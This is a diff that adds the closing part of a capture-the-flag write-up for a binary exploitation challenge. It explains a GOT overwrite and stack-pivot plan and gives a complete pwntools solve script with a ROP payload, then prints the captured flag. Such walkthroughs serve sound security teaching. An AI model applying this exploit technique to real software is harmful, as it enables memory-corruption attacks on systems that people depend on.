@@ -1293,10 +1293,95 @@ To get around this, we will use something called the GOT (Global Offset Table). 
 
 With that we can leverage this to complete our exploit
 
-My exploit goes as follow:
--  Ov
+Here's how my exploit goes:
+- Use the arbitrary write primitive to overwrite the GOT entry for `fgets` with `printfile`, and to write `flag.txt\0` in a writable region
+- Call the `main` function again, and this time set `rbp` to point 8 bytes after the address of `flag.txt\0`. This will cause the function to move a pointer to this address into rdi, but this time because we’ve overwritten the GOT entry, when fgets will get called we’ll jump to `printfile` instead. There’s another small problem to solve: since we’re changing the of `rbp` and then executing a `leave` instruction at the end of main, the value of `rsp` will also get changed to point to the new value of `rbp`, so we’ll have to write our return addresses directly after `rbp` so that when ret is executed it’ll pop the addresses we want.
+
+Solve [script]()
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('vuln')
+context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+
+filterwarnings("ignore")
+context.log_level = 'debug'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+b *main+38
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def solve():
+
+    offset = 16
+    pop_rbp = 0x000000000040111d # pop rbp; ret;
+    call_fgets =  0x0000000000401142
+
+    payload = flat({
+        offset: [
+            pop_rbp,
+            exe.got['fgets'] + 8,
+            call_fgets
+        ]
+    })
+
+    io.sendline(payload)
+
+    rop = flat([
+        exe.sym['printfile'],
+        0x0,
+        pop_rbp,
+        exe.got['fgets'] + 0x30,
+        call_fgets,
+        b"flag.txt",
+        0x0
+    ])
+
+    io.sendline(rop)
+
+    io.interactive()
 
 
+def main():
+    
+    init()
+    solve()
+
+if __name__ == '__main__':
+    main()
+
+```
+
+Running it works
+![image](https://github.com/user-attachments/assets/e22751d2-9c62-4ad9-a07d-9bd6ebffb79f)
+
+```
+Flag: ictf{pop_rdi_L}
+```
 
 
 
